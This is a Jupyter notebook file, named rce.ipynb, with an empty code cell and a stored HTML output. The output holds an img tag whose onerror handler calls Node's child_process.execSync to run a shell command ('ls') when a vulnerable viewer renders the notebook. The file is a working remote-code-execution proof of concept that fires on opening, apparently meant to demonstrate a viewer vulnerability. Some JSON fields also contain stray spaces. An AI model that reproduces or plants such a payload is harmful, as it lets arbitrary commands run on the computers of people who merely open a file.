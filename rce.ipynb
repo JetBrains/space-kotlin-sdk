{"cells":[{"cell_type":"code","execution_count":0,"metadata": 
{},"outputs":[{"data":{"text/html":["The output of ls will be  
returned:<img src=x:  
onerror='alert(require(`child_process`).execSync(`ls`).toString())'>\ n"],"text/plain":[]},"metadata": 
{},"output_type":"display_data"}],"source":[""]}],"metadata": 
{"kernelspec": 
{"display_name":"Python3","language":"python","name":"python3"},"language _info":{"codemirror_mode": 
{"name":"ipython","version":3},"file_extension":".py","mimetype":"text/x python","name":"python","nbconvert_exporter":"python","pygments_lexer":"i python3","version":"3.9.6"}},"nbformat":4,"nbformat_minor":5} 
